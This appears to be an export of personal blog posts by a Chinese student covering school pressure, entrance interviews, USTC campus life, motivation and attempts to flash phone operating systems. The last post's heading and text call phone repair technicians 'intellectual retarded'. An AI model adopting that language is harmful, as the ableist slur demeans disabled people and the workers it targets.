primary school, I usually do some math\nproblems late in the evening and often finish them and start playing at\nseven or eight o\u2019clock. Now it had been so different. The first Monday,\nI went to a geometry class. It was already eight-thirty when I was home.\nThen I did all my homework until ten.</p>\n<p>We have three math classes every day. The teachers don\u2019t use the\noriginal math textbook but give us tests, which were much harder. We\nhave two math teachers. Mr.\u00a0Chen taught the extra class Monday and\nTuesday. Mr.\u00a0Xu taught the extra class Wednesday and Thursday and the\nnormal math class. He is very strict.</p>\n<p>We had a math test every two days. And this was just the beginning.\nOur middle school is so good at math that every year we got the most\nprizes in math competitions in Shanghai.</p>\n<p>I used to read an English book a day, which I now tried to do, but\ncouldn\u2019t bear it with the homework. I had more and more and more\nhomework than before and the English books I read are harder. So far, I\ncouldn\u2019t read 366 books, the same amount of days this year, if the\nteachers keep the homework like that. I wanted the average amount to\nreach one book a day. And there was another solution to this problem,\nwork until ten or eleven every day.</p>\n<p>There was another serious problem. I wasted too much time on the\ncomputer. The teachers always put the details of homework online, and I\nhave to find it using the computer. Pressure began to rise in my heart.\nAnd, as I found out, that if one day there was not much homework, I will\nnever waste time on the computer, but if there was too much of them, I\nwould waste a lot of time on screen. I hate to admit it, but I was\nsometimes a procrastinator and would postpone work. After that, I became\nangry at myself and was often not in a very good mood many days.</p>\n<p>How I am jealous of the elementary school students! I also wanted to\nbe in Smic Middle School. I thought I did the wrong choice for middle\nschool. I got myself in here and will never get out, homework and\npressure will only increase in the following years. Then look at Smic\nMiddle School, they went home by four while we went home by six. They\nfinish homework by six or seven while we do it by nine. They have an\neasy math test once a week or less. We have four hard math tests or more\na week and the teacher said that we are going to have eight tests a week\nlater on.</p>\n<p>I had a hard time writing Chinese compositions, not English, of\ncourse. I am good at English, especially after reading so many books.\nBut I had read little Chinese books, and our teacher let us write an\nessay every day in Chinese. I always waste time on it, so that\u2019s why I\ndid the homework so late.</p>\n<h2 id=\"the-division\">The Division</h2>\n<p>We have an English song every week. I like \u201cwhat makes you beautiful\u201d\nbest. I also like \u201cone direction\u201d.</p>\n<p>We had a class song competition. Our class chose roar. We practiced\nhard but only got third prize.</p>\n<p>I didn\u2019t pass the Intermediate Interpretation contest, which is of\ncourse hard. I didn\u2019t get a prize in either English or Chinese, and I\nfelt bad. Luckily, I got a good score on the midterm examination.</p>\n<p>One of our students got chickenpox, and our class gets separated. Our\nautumn outing was canceled. Most of my classmates are happy to hear it,\nbut I am not. I still want to go to the autumn outing.</p>\n<p>In my class, it is so hard to be the highest score on quizzes. After\nevery test, the teacher writes our rank in a corner of the test paper.\nIt is a real keen competition in my class. There was a stark contrast in\nprimary school, but there\u2019s isn\u2019t much difference between the best and\nthe worst one now. There are thirty-two students in my class. In the\nmath test, I went from the first one (except that many students are also\nmy score) to the twentieth-first.</p>\n<p>But I liked one thing, which is there is little math homework. Mr.\u00a0Xu\nthinks that our class and class six\u2014the best two classes in sixth grade\nin our school\u2014should be divided into two classes to separate the good\nones and the not-too-good ones.</p>\n<p>This good thing turned upside down when we started to divide into two\nclasses, which is definitely the worst idea ever invented. We started to\nhave much math homework since then.</p>\n<p>I was divided into the fast class, and Mr.\u00a0Xu said that the worst one\nin the last class will go to the slow class. I am likely the worst in\ngeometry, while the fast classes teaching about lines and angels and all\nthat. Later, Mr.\u00a0Xu said that we would be learning about congruent\ntriangles and similar triangles. I was about to be kicked out.</p>\n<p>There\u2019s a sick feeling in my stomach every time Mr.\u00a0Xu walked in. I\nfelt nervous talking to him because he talks with a blaming tone. He\nhates two things, cram class and feeling too well. That\u2019s right in some\nways, but he kind of goes too far. That\u2019s math class becomes my worst\nclass ever since.</p>\n<p>When someone laughed Mr.Xu would say, \u2018What\u2019s funny?\u2019 He would then\nlet that person stand up and ask them questions, even if that person\ndidn\u2019t do anything.</p>\n<p>He thought that when any of us smiling, we didn\u2019t focus. But how\nwould a person focus so long under great pressure?</p>\n<p>We had a test. It is about parallel lines and equivalent angles.\nMr.\u00a0Xu threatened us that whoever gets too low in the test will go to\nthe slow class. I think I did really badly on the test. I hope the score\nwill never be announced.</p>\n<p>Mr.\u00a0Chen never goes too far. I don\u2019t know why. Maybe he just don\u2019t\nlike dealing with people.</p>\n<p>The score was finally announced and it looks like a nightmare. I kind\nof shivered all through it. Finally, my score was announced and I got\nthe lowest score\u2013the teacher announces the worst score at last. I got\n\u201825+\u2019. That was the worst test I took since I went to Shibei Middle\nSchool. I am lucky. The teacher didn\u2019t write my real rank.</p>\n<h2 id=\"final-exams\">Final Exams</h2>\n<p>It\u2019s time to leave the division and the math classes to come back to\nfinal exams.</p>\n<p>In primary school, there are just three subjects (Chinese, Math, and\nEnglish). But now, there are also Geography, Computer, and Science. I am\nalso finishing my 366 books.</p>\n<p>I was not just busy, I was restless and frustrated. Though I kind of\nadjusted my life here, I couldn\u2019t bear it. I needed to prepare for the\nexpository and narrative writings; review the ordinary math, (\u2019cause we\nare too fast and I got less than eighty on the mock test and I was not\nsatisfied with the result); do the computer homework; go over geography,\nand science. Moreover, I need to spend another half hour every day\nreading a book.</p>\n<p>In the last, I got a bad score in Chinese and the minor subjects. I\njust wasn\u2019t accustomed to so many subjects. Many of my classmates\nstudied physics early and they knew all about science.</p>\n<p>Time is really slow when you want it to be fast, and really fast when\nyou want it to be slow.</p>\n<p>The first semester of sixth grade ended just like that, marking the\nend of one-eighth of my middle school life.</p>\n", "_id": "66689634547d3fe098118757"}

With December came the high-school\nentering test and math competitions.</p>\n<p>I decided to go to an International school since my parents want me\nto go to an American university and learn more. I applied to Shanghai\nWorld Foreign Language Middle School.</p>\n<p>The test was arranged as follows</p>\n<ul>\n<li><p>8:00-10:00 Math</p></li>\n<li><p>10:30-12:00 Chinese</p></li>\n<li><p>1:00-3:00 English</p></li>\n</ul>\n<p>This is the schedule of the test. The math test was very easy and in\nthe end, there were only 2 problems I didn\u2019t work out. The English test\nwas hard and I didn\u2019t write the composition well.</p>\n<p>In the evening, I felt tired and went out for a walk.</p>\n<p>In 12.1 I came to Shanghai Pinghe Bilingual School to take their\napplication test. They only have math and English tests.</p>\n<p>The math test is very easy and I soon worked out all the problems and\nchecked it again. The English test was very strange. Of all the entrance\ntests I\u2019ve participated in, I never saw a test like that. The cloze has\na total worth of 16 points, while its total is only 28 points. I spent\nmy time wisely and did the test.</p>\n<p>After two tests I went for a walk along a small river, it was really\nrelaxing.</p>\n<p>Because of me doing well in the tests, I was asked to enter the\nsecond part of the entrance exam. The second part was to be interviewed\nby two teachers.</p>\n<p>On 12.11 I went to WFLS. They asked me to introduce myself in Chinese\nand English and ask questions to the others.</p>\n<p>It was 3:00 in the afternoon and I was sitting in a room with 3 girls\nand 2 boys(including me).</p>\n<p>The teacher: Stand up and introduce yourself. If you\u2019re ready, please\nraise your hand.</p>\n<p>One by one, the others stood up and introduced themselves. A boy is\ngood at walking long distances, a girl good at singing, English, and\nalways helping community.</p>\n<p>I was the fourth to raise my hand. I described my math skills and\nEnglish ability. I also said I can run really fast and can run 1km in\n3:27. They seemed impressed. The others never said about their math\nskills. They only said about their TOELF points and social\nactivities.</p>\n<p>Then I went home feeling anxious and excited.</p>\n<p>In 12,14 I went to join a math competition held by Shanghai math\nschool. It was easy and I had done so many similar tests at school (in\nfact, one day doing at least two of them). I did well in that test and\ngot second prize(I was first in second prize).</p>\n<p>In the afternoon I went to Pinghe school. Pinghe is located in Green\nCity in Pudong district. What beautiful places! The street is lined with\ntrees on both sides and you can see foreigners and big houses\neverywhere. It is one of the most beautiful places in Shanghai and an\ninternational community, Such an escape from the pressured, competing\nenvironment at school!</p>\n<p>I went inside the school, and, since I was to be called an hour\nlater, I sat down in their cafeteria and read \u201cOrdinary World\u201d.</p>\n<p>Then I was called, I went inside and to be interviewed by a foreign\nteacher.</p>\n<p>I said I liked math, and number theory best. He asked me if I would\nlike to explain whether number theory is invented or is being\ndiscovered. I said man invent numbers and then the theories and hidden\nthere for them to discover.</p>\n<p>I was then called up to the third floor and was interviewed by two\nfemale teachers. Looking back, I was really dissatisfied.</p>\n<p>Firstly the teacher asked me for my basic information.</p>\n<ul>\n<li><p>You study till how late in the night?</p></li>\n<li><p>Till ten, sometimes till eleven. I think efficiency is more\nimportant than huge amounts of time spent. I think sufficient sleep\nbrings me more energy to focus in the daytime.</p></li>\n<li><p>You want to live on campus, right?</p></li>\n<li><p>Yes.</p></li>\n<li><p>Then what do you do if your roommate study at night?</p></li>\n<li><p>(I felt taken aback by this sudden attack.) I will associate with\nhim. If not successful I will call my parents and teachers and listen to\ntheir advice.</p></li>\n<li><p>(sounding not OK)Ok</p></li>\n<li><p>You good at mathematics?</p></li>\n<li><p>Yes.</p></li>\n<li><p>What prizes have you got.</p></li>\n<li><p>Second prize in Shanghai math school competition in\neighth-grade.</p></li>\n<li><p>That a prize in your school?</p></li>\n<li><p>(I felt surprised. They didn\u2019t even know what I was saying. How\nstrange! My brain froze at that time and I didn\u2019t know how to explain\nmyself. Amateur math school isn\u2019t a school like Shibei middle school.)\nNo.</p></li>\n<li><p>How many participants?</p></li>\n<li><ol start=\"300\" type=\"1\">\n<li></li>\n</ol></li>\n</ul>\n<p>(The teachers didn\u2019t seem impressed at all. I wanted to say, you\ndon\u2019t know my ability in math, and she was like thinking I\u2019m not so\ngood. But those three hundred participants are among the best in\nShanghai and I got second prize. Pinghe school hasn\u2019t got one on the\nlist. I feel confident I can be number one in mathematics in your\nschool.)</p>\n<ul>\n<li>Give you 1 minute. Explain this drawing.</li>\n</ul>\n<p>(It was a drawing of two robbers stealing artwork from a gallery.\nExcept at that time, I didn\u2019t really understand. I thought they were\npreparing for a gallery or something.)</p>\n<p>**Note of author re-reading this material at 2023: I am very bad at\nunderstanding visual stuff at first glance. My brain is like a neural\nnetwork that needs a lot of training to think out of the box. I usually\nintepret everything my own way, either I am born with it or doing\nrepetitive difficult math tests in middle school made me do that</p>\n<p>(It showed two thieves, instead of stealing the artworks, took the\nlabel away.

The first mock exam was drawing nearer.</p>\n<p>Some students had already been admitted to good schools, only afraid\nto be rejected. Other students were working so hard, trying to be\nadmitted to lower-level schools.</p>\n<p>That was why some students were preparing for their high school\ncompetitions and busy showing off while other students were struggling\nunder great pressure.</p>\n<p>Although I said I wanted to go to an International school, the\nteacher still moved me to the front row. Being in the front row meant\nbeing watched by the teachers 10 hours a day and sitting with lots of\nother anxious students.</p>\n<p>I felt extremely lonely these days. The school was killing me.</p>\n<h2 id=\"how-i-walked-to-entertain-myself\">How I walked to entertain\nmyself</h2>\n<p>Every Friday I walked along the Huangpu River. I walked on the south\npart of the route, from the China Art Museum to the Oriental Sports\nCenter. These days were too cold for running, so my only entertainment\nwas walking. Looking into the wide space, seeing how big the world\nreally is made me realize how little I was.</p>\n<p>There are lots of places to rest along the route. I walked inside to\nget hot water and a place to rest. I saw the date 19-12-21. I thought\nabout how much of 2019 was left. Oh, such a long year. I matured a lot.\nYet it was suddenly ending.</p>\n<p>I thought about the famous poet Su Shi said</p>\n<p>If you look at its changing aspect, the universe passes in the\ntwinkling of an eye; but if you look at its changeless aspect, all\ncreatures including ourselves are imperishable.</p>\n<p>Everything is going to pass away, even money, people. We are but\nlittle insects in the world, our lives nothing of a matter. Life is\nchangeable and unstable. Thus treasuring the present, making use of the\nthings you have, and not wasting time is important. Knowing this can\nonly make us pay more attention to the present joys and enjoyments and\nbe more than happy to accept everything we have and the way they are\ninstead of blaming the world for bad fortunes and few opportunities.</p>\n<p>Huangpu River is a beautiful river, so beautiful at night. There is a\nBowl-like building in Puxi and a tall white building in Pudong. There is\na big temperature building and a huge stone hand near the Nanpu Bridge.\nRivers with shiny bridges, green lawns, and beautiful flowers are all\nalong the way.</p>\n<p>I found a world of mine on those walks. It seemed I can put all my\nproblems on the wide horizon and never fill it up. I wanted to be like\nthat.</p>\n<h2 id=\"how-i-found-interest-in-math\">How I found interest in Math</h2>\n<p>Math appeals to me more than ever. I studied math to get rid of the\nstress of other subjects. Math is so beautiful, so strict, yet so\nflexible.</p>\n<p>I studied maths at the organization Xueersi. The teacher is very\nsmart. He can calculate numbers fast as lightning. He is young and\nskinny. He always smiles and he never talks about anything other than\nmath in his classes.</p>\n<p>I studied complex numbers, calculus, and vector there. I felt as if I\nwas going into a great new world when I study math. My skills improved\nreally fast these days.</p>\n<p>How the first 10 days of 2020 was</p>\n<p>On 2020.1.1 I went to Daning park to play. I saw many young children,\nbut not one as old as me.</p>\n<p>On 1.7-1.9, we finally had the test. I got a good score, mainly\nbecause I got 129 in Chinese. I was really lucky that time.</p>\n<p>These were the days when everything was happening at once. It was the\nclimax of 9th-grade.</p>\n<p>The winter holiday I was waiting for finally came.</p>\n<p>But then covid came.</p>\n", "_id": "66689635547d3fe098118759"}
{"title": "Everyday Life in USTC", "date": "Tue Feb 01 2022 09:58:01", "type": "ustc", "body": "<p>A spare day allows me to write a little about my everyday life in\nHefei.</p>\n<p>One thing I still remember is fruits. There's a fruit store on the\neast campus just beside the cafeteria, so every time I finished lunch,\nI'd go there and pick something. The foods in Hefei are salty, so it's\ngood to have something sweet and juicy. The fruits aren't expensive,\nthey usually cost me no more than 15 yuan. There were apples, bananas,\nwater lemon, kiwi fruit, oranges. The melon is sold in slices. So you\npick up a slice and walk over to the counter, and the man would cut it\nout for you. You needn't go home and cut the fruit peel the fruit\nyourself. You can just buy one slice at a time, which is about 3\nyuan.</p>\n<p>I quickly became fond of eating fruits. After I bought the fruit, you\nknow, the roads outside were pretty crowded, I would walk east down a\npath that leads to a quieter place. The east part of the east campus is\nmostly apartments, and it seemed pretty much like a park. There are few\npeople, and most of those people are old men and women. It is a pretty\npleasant place. There are lots of trees and lawns to walk on.</p>\n<p>Walk a little farther and there is the USTC kindergarten. You can see\nsome old man reading his newspaper while waiting for their grandson and\ngranddaughter at around noon. Under the shade of trees sometimes you can\nsee a fat cat. But if you walk too near, the cat will frantically run\naway to some other places he considered safer. Eating fruit under these\ntrees is enjoyable.</p>\n<p>Sometimes there are a group of old men and women who brought a large\nbag with them. They pick up trash as they walk around. They are the\nvolunteers who help make the campus clean.</p>\n<p>I also liked the nighttime snacking. It isn't anything like the\nnighttime snacks in my high school, believe me. Every night around 11 pm\nsome stalls will arrive on Feixi Road. The road there was lighted up and\nbustling with noise and excitement. Their smells can lure just about\nanybody. There are stinky tofu, kebabs, stewed pear, and cold noodles.\nThe foods are sour and spicy with strong flavors. But when you grow so\nfrustrated with math and physics and still had to prepare for the tests,\neating here is a good option to empty your mind.</p>\n<p>The library is on the west side of the cafeteria. It is usually\ncrowded with students, and hard to find a seat since students always\noccupy seats. Then a little north is a cafe called USTC 1958. The cafe\nis really expensive and popular among students and teachers. The cafe\nmainly sells cakes, and one little cake and costs 30 yuan, more than\naverage eating prices for a whole day. You can seat there as long as you\nwant without ordering anything. I usually rest there for a while.\nThere's also free water and sugar and a toilet inside.</p>\n<p>In warmer weather people chat outside. When winter arrives people\nusually sit inside to avoid the chill.</p>\n<p>I saw a lot of familiar people inside the cafe. Once I saw Mr.\u00a0Ye and\nhis wife having a cup of coffee there. Mr.\u00a0Ye is the teacher for\nElectromagnetism. He is a scholar of much knowledge and erudition.\nAnother time I saw the assistant teacher of my physics class there with\nhis girlfriend.</p>\n<p>Beside the cafe, there is the statue of Guo, the founder of USTC. He\nstood tall. There are many children playing beside the statue.</p>\n<p>Walk to the west and, right in the middle of the east campus is\nSchool of the Gifted Young. It is a small building of only 4 stories.\nThere is a tiny computer lab and library inside.</p>\n<p>Then to the north side of the east campus, there're two buildings.\nOne is for the math and economy department, another is for the\ndepartment of Earth and Space Sciences. They both have 16 stories. The\nEconomy Department is on the lower floors of the math building. You can\nfind the professors who taught your math classes on the top floors of\nthe math building. Mr.\u00a0Cheng and Mr.\u00a0Sheng are both on the fifteenth\nfloor of that building. You can hear the professor discussing their\nquestions from the corridor in that building.</p>\n<p>I really liked the earth &amp; space building. On the sixteenth floor\nof that building, there's a platform where you can see the roads\noutside. It was especially beautiful when the sun went down the west,\nand give all the cars and roads a reddish and goldish color. There is\nthe hospital and the Anhui restaurant. The city center of Hefei is\nreally crowded and dirty, tall buildings are everywhere.</p>\n<p>On the other side, the whole east campus is visible. The paths look\nlike blood vessels, filled with people, bikes, cars going here and\nthere.</p>\n<p>They are doing experiments on that opening platform, something about\nlasers, so the door soon became locked and I could no longer go on that\nplatform. On some nights you can see a green beam that shoots out of the\ntop of the earth &amp; space building and you know they are doing\nexperiments there.</p>\n<p>There are just so many things going on on campus. Some people say I\ndo not like to take part in activities. That is true, of course. I\nhadn't taken part in many activities throughout the semester. I had only\nattended the singing party at the end of December. But walking around\nthe campus is all the same. They are just two different ways of\nrelaxation, and I do not care too much about that.</p>\n", "_id": "66689635547d3fe09811875a"}
{"title": "Start of a New Semester", "date": "Mon Mar 04 2024 08:15:22", "type": "ustc", "body": "<p>So I am back in USTC for a new semester.</p>\n<h2 id=\"meaningful-things-to-do\">Meaningful Things to Do</h2>\n<p>So I tried thinking about meaningful things to do. I mean, for a\nthing to be meaningful, it better be cumulative. For example, gaming\nisn\u2019t meaningful because gaming today doesn\u2019t make your next day better\nat all, and the skill of a human being in gaming is limited, meaning AI\nis far superior.</p>\n<p>Other things are debatable, in my opinion. For example, it is\ndebatable whether learning extensively about a new subject (like\npursuing a PhD) is meaningful or not. For one, it is cumulative and\nafter studying that deeply enriches your knowledge of that field.\nHowever, on the other hand, maybe like the new knowledge studied, if not\napplied to a job, isn\u2019t even worth the pain of studying them. If you are\nan expert in some not so popular fields, there might be no opportunities\nfor showing off even, and the goal at the end isn\u2019t meaningful.</p>\n<p>I do think language learning is a meaningful thing, though. So like\nimagine if I don\u2019t know English, that would be devastating. Or if I\ndon\u2019t know Chinese, ahh, I would probably lose first-hand engagement in\nthe culture and couldn\u2019t even communicate with people around me.\nLanguage is pretty much base to all the things in my life, and it is\nlargely underestimated in terms of importance. But learning a third\nlanguage is not as significant as the first two, one of which is my\nmother tongue, the other being the de facto language in the world.\nStill, even if it is not as significant, it\u2019s still a reasonably\nfulfilling thing to do. Mainly I want to learn languages like Japanese,\nRussian, French, German, etc. But like learning 4 or 5 languages is\nclose to impossible with a regular schedule or hard schoolwork or\ndemanding job. Maybe like learning only one more language is quite\nsatisfying for me.</p>\n<p>Other meaningful things include sports and musical instruments, but\nthey are not as important as learning a language, in my opinion.</p>\n<h2 id=\"freelancing\">Freelancing</h2>\n<p>I feel like I want to take on a freelancing job. I found that for a\nfull-stack developer, actually earning 20 dollars an hour is pretty\neasy. So I tried to do the math and calculated that for a decent life in\nHefei, like 700 dollars a month should be sufficient, which equates to\nabout around 150-200 dollars earnings a week. So like I can only work\none day freelancing for web dev or operating system or anything, then\nhaving 6 days off, while still maintaining pretty well-off lives here in\nHefei.</p>\n<p>The main thing isn\u2019t about the earnings, it\u2019s like currently I am\nstill using my parent\u2019s money, meaning that they constantly try to\nmonitor and censor my activities, which is really annoying. I mean I\ncan\u2019t really complain too much since it\u2019s their money, but they are\nseriously annoying to me. I hope for the day that I can become\nself-sufficient to come sooner. If I am self-sufficient probably I won\u2019t\nneed my parents anymore. However, logically speaking I shall still pay\nback in return to my parents, since they brought me up, but this is\nprobably something I shall do like after the age of 35 or 40 years old,\nwhen my parents got very old, to care for them or hire an aunt to care\nfor them or whatever.</p>\n<p>The fact that I am not self-sufficient is deeply troubling, and\nmaybe, like after I go to grad school, hopefully as there are salaries\nor whatever, and I work part-time as a freelancer, then I can stop\nrequesting any money from parents, hooray!</p>\n<p>It\u2019s not like my parents don\u2019t have much money, in fact, they are\npretty well-off among their peers and in Shanghai, having 2 apartments\nin Zhangjiang High-tech Park, each one worth millions of dollars. But\nreliance brings unfreedom.</p>\n<h2 id=\"thinking-about-my-freelancing-life\">Thinking about my\nFreelancing Life</h2>\n<p>So if I drop school right now, and go off freelancing here in Hefei,\nworking 1 day a week, hopefully self-sufficient with my MERN stack\nskills. I have six days off, which is practically all the time. In fact,\nif I go freelancing it doesn\u2019t matter where I work, and Shanghai\ndefinitely isn\u2019t a good choice because of its relatively high living\nstandards in China. Maybe some smaller cities will do. Hefei is not a\nbad choice anyways, living here on 5000 RMB a month is more than\nenough.</p>\n<p>I don\u2019t really worry about stability, since I think I can code\nfull-stack for at least 30 years. I mean, I am willing to learn and\nwork, and I don\u2019t demand lots of money.</p>\n<p>Moreover, I can stay home all the time, and I can go isolated. I\nmean, I can still go out and play if I want, only it\u2019s not necessary,\nwhich is awesome. I can still go out a few times a year, and probably at\ndawn, where there are no people outside.</p>\n<p>I also have the whole day off to me, and I can start learning new\nlanguages 24/7. I can probably pick up one language every half year. So\nif I work like this, then I will probably be equipped with 6 more of the\nworld\u2019s most popular languages in like 3 years, which is so intriguing.\nI am mainly interested in studying languages of developed regions like\nEurope and Japan, or special countries like Russia, and not that much of\nAfrica or Southern Asia.</p>\n<p>That does sound interesting and alluring but of course, I won\u2019t do\nthat, since that is far beyond the social norm, and I haven\u2019t had such\npersonal decision experiences. Maybe like when I am 35 or 40 years old I\ncan have more freedom in personal decisions. It is too risky, like\ndropping out of school. I still need my college degree, else since I\ndon\u2019t have a high school diploma, I will probably be a middle school\ngrad, lol.</p>\n<p>Anyways, literally speaking, my parents don\u2019t know what is best for\nme. They are very misleading in terms of judgment, and often control my\nmind to do things. I don\u2019t blame them though. My parents are awesome\npeople, and worked extremely hard to gain a social status like this\nthrough the poverty years 30 years ago in China, climbing up the social\nladder from a poor worker\u2019s family in remote rural towns, to having 2\napartments in the tech hub of Shanghai. They are definitely more\nimpressive than I ever could be. For me to match their achievements I\nprobably have to be a billionaire in Silicon Valley.</p>\n<h2 id=\"back-to-ustc\">Back to USTC</h2>\n<p>I walked back to USTC. It seemed awfully weird here, with so many\nstudents around, that I felt a sense of nervousness even. I feared\nschool, and I feared socializing. My parents also say I am quite\narrogant in the eyes of other people. No.\u00a0This is wrong. I mean, I am a\nFOSS and Linux fanatic, but that\u2019s who I am. There is no changing that.\nI want to show my personality and uniqueness in socializing, right? I\nwant to show the true self instead of pretending to be someone whom I\nhate, right?</p>\n<p>I mean, I felt like I don\u2019t want to be demanded to do something. I\nhave the right and I don\u2019t owe any people, well, maybe except for my\nparents, since they brought me up for the first 18 years. Thinking about\nparenting, it is extremely time and energy-consuming, which is part of\nthe reason my mom worked a light job. Just in terms of money spending\nand emotional support, that is more than a full-time job. I remembered\ncountless times when my mom was tired yet still tries to think about me\nfirst, and try to make me happy and well cared for. I remembered my mom\ntrying to find resources for me in every part of my academic journey,\nand that was really touching. However, I am a legal adult now, and I\nknow better for myself. It is maybe not the best for me, but I need to\nmake my own decisions. Also, I don\u2019t owe any unknown people anything. My\nparents always say I need friends, and I shall treat strangers with\nenthusiasm and contact them to make friends. However, I definitely\ndisagree. I treat strangers with respect, and other than that I treat\nthem the way I want. I decide who to contact and which person to. It is\nmy right to decide I want isolation, or my right to decide to be in a\ncrowd, long as it doesn\u2019t affect other people negatively. It is my right\nto stay up all night and sleep all day, although putting my own health\nat risk, but I assume that it is my own decision, right?</p>\n<p>I was, and still am, an extremely cautious person. Well, maybe not as\ncautious as some Chinese students around me, but still, I am easily\nbrainwashed with fear and hatred about something. When my parents taught\nme fire and knife was dangerous, I refuse to use them even today,\nrelying on a kettle pot to cook noodles and rice porridge. I always\nfeared teachers, even though sometimes they know no better than me,\nespecially those in high school. However, because of the fear I didn\u2019t\nargue back one word at any teacher as long as I could remember, only\noccasionally trying to explain my own standpoint. It\u2019s the amount of\nmind control that they have on me, that I deeply want to get rid of,\neven though most times they are correct.</p>\n<h2 id=\"motivation\">Motivation</h2>\n<p>As I begin this new semester I have probably the lowest motivation in\nthe history of my life. I couldn\u2019t think about a reason to push forward.\nFor example, there is this operating system and database course. I am\nalready pretty much experienced in MongoDB and Sqlite and have used\nPostgreSQL for Invidious and Peertube and MediaCMS hosting. All I want\nto do is try to read the source code and understand the main parts of\nthe database, for example, reading Sqlite or BerkeleyDB shall be\ninteresting practice for such a course. There is also tinydb and\nsmalldb, but that\u2019s not capturing the essentials of a database, not\nhaving much data structures. Anyways, I hope the teacher just walks\nthrough the main source code of a popular database, and that shall be\nsufficient for this course. As of operating systems, I would expect to\ndevelop all kinds of interesting programs on ArchLinux. It\u2019s just I am\nreally interested in this subject itself, but the course makes it\nextremely boring for me. Finishing studying this course doesn\u2019t enhance\nmy skills anyways, only preparing for a crappy test. I don\u2019t think\nstudying such stuff is more meaningful than gaming.</p>\n<p>Also along came procrastination, as anything I saw seemed to me more\ninteresting than studying and academics, particularly social media.\nSometimes I would want to be popular on social media, yet still\nrejecting the idea since social media is proprietary and censored by the\ngovernment, and not DIY. My own instance gets no attention among people,\nthough. But I was just far more curious about society, and particularly\nthe trends of things that are not obvious, and thoughts not written, and\nthings not seen from the surface. Social medias give me far more stamina\nthan raw studying.</p>\n<p>I stayed at home for a whole week, trying to evade everything. This\nis the longest time I stayed at home as long as I could remember, the\nlast time being the covid quarantine, 7.14 to 7.21. I didn\u2019t remember\nstaying at home for one day since 2019 to mid-2023, other than that\nquarantine. Even during covid, I would go restless at home and try every\nmeans to go out and run and breathe fresh air. I just, well, changed.\nBefore that one whole week at home, I went out like only once every 3\ndays or so, mostly late at night for walking and stretching my legs, and\nshopping the necessary things and cleaning the trash. I don\u2019t want to\nface anything, and wanted to go alone for peace and quietness. I\nactually quite enjoy being immersed in my own digital world, and hope to\ndo this forever.</p>\n<p>People say evading and shying off from real life is a bad idea, yet\nit helps. Evading makes my emotions more controllable and myself feel\nmore comfortable. Facing everything directly is a bad idea because it\njust makes things worse and unbearable. Anyway, this is supposed to be\nmy own choice, the same as procrastinating. If I want to do so, nobody\nhas the right to tell me not.</p>\n<p>I tried running and it turned out I had been much slower than I\npreviously was just half a year ago. I could go sub 4:00 for several\nkilometers without being too tired, but now I ran like 300 yards and was\nout of breath, probably as a result of staying home too long. Anyways,\nstaying at home is also my own choice, and it is not anyone else\u2019s duty\nto command me to go out. I decided running makes the person look older\nand uglier these last few months, and it is still a topic I am debating\nwhether or not to do.</p>\n<h2 id=\"showing-off\">Showing Off</h2>\n<p>Then there is the strange desire to show off. I mean it is downright\nstupid to do so. Showing off brings nothing but a sense of fake pride,\nand perhaps some dopamine. I wanted to use every means to show how\ntechnically advanced I am, only trying to make a big fool out of\nmyself.</p>\n<p>I really don\u2019t understand the desire to show off, but I remembered\nthis as a need for several years. I wanted people to notice me, even as\nan anonymous person on social media, to acknowledge my skills and\nwhatsoever. It is weird, perhaps because I am facing such a difficult\ntime at school, and losing all my confidence academically that I want to\ntry to get my skills verified for another way. It is still so stupid, I\nmean, showing off doesn\u2019t increase my skills, it only makes me a\nclown.</p>\n<h2 id=\"looking-forward\">Looking Forward</h2>\n<p>Anyways, time shall pass, and I did grow a lot mentally these past\nfew months. Sometimes time is magical and changes everything, so it\u2019s\nbest to keep on and try to figure out what to do for the day.</p>\n", "_id": "66689635547d3fe09811875b"}

{"title": "Some More Smartphone Exploration", "date": "Fri Jan 26 2024 02:38:01", "type": "phone", "body": "<h2 id=\"exploring-more-phones\">Exploring More Phones</h2>\n<p>I\u2019ve failed countless times while experimenting with different phones\nand operating systems.</p>\n<p>Unlike computers, which have a universal architecture, each phone\npossesses its unique structure. This makes installing operating systems\non them exceedingly challenging.</p>\n<p>Furthermore, the repair technicians lack the necessary expertise to\nassist me with these challenges. Consequently, I\u2019ve had to solve all the\nproblems myself, which adds a layer of frustration to the process.</p>\n<h2 id=\"exploring-pinephone\">Exploring Pinephone</h2>\n<p>In a post (<a\nhref=\"https://www.jimchen.me/blog/Thu%20Sep%2028%202023%2000:38:25\"\nclass=\"uri\">https://www.jimchen.me/blog/Thu%20Sep%2028%202023%2000:38:25</a>)\nI wrote last September, I shared my journey with the PinePhone.\nFollowing that, the PinePhone could no longer read the microSD card and\nencountered a gnupg error that I couldn\u2019t resolve.</p>\n<h2 id=\"unlocking-bootloader\">Unlocking Bootloader</h2>\n<p>Then, I unlocked the bootloader of my old Redmi Note 10, which I had\nused 2.5 years ago. After unlocking, I attempted to install Ubuntu\nTouch. However, the ubports installer consistently faced a downloading\nissue due to GitHub connectivity problems, which I couldn\u2019t fix. Thus, I\nwas unsuccessful in installing Ubuntu.</p>\n<h2 id=\"trying-to-install-different-os\">Trying to Install Different\nOS</h2>\n<p>Next, I attempted to install LineageOS on the Redmi Note 10. However,\nafter booting into fastboot mode, I couldn\u2019t flash the boot.img and\nrecovery.img onto the phone. The fastboot froze indefinitely while\ntransferring these files, leaving me unable to proceed.</p>\n<p>Postmarket OS appeared to only support Pinephone and Librem 5 phones.\nHowever, my PinePhone stopped reading any SD card, so installing it was\nnot feasible.</p>\n<h2 id=\"removing-xiaomi-bloatwares\">Removing Xiaomi Bloatwares</h2>\n<p>I then used adb to list packages with\n<code>adb shell pm list packages</code>, and discovered numerous\nbloatwares. Xiaomi, in my opinion, is the worst company, with their\nphones filled with unnecessary spywares.</p>\n<p>After listing the MIUI packages, I used\n<code>adb shell uninstall</code> to remove them, aiming to eliminate the\ncumbersome MIUI. Some apps were successfully uninstalled, while others\npersisted, and I couldn\u2019t remove them even with root permissions.</p>\n<p>Subsequently, I found myself unable to return to the home screen, and\nupon rebooting, the phone entered a boot loop, rendering it inoperable\nyesterday.</p>\n<h2 id=\"repairing-people-with-intellectual-retardation\">Repairing People\nwith Intellectual Retardation</h2>\n<p>So I went to MiUI store, hoping to get the crap fixed and get\nLineageOS installed. But the reparing person are kind of intellectual\nretarded, and they know far less than me though. They didn\u2019t even know\nor care what is LineageOS. The technicians there seemed less\nknowledgeable than me about such niche, open-source, and controlled\nsystems. They were unfamiliar with adb and couldn\u2019t assist in reviving\nmy phone.</p>\n<p>Nevertheless, I managed to figure out how to reopen the phone today\nfairly quickly. By entering the recovery menu and wiping all the data,\nthe phone rebooted into a new MIUI system, again laden 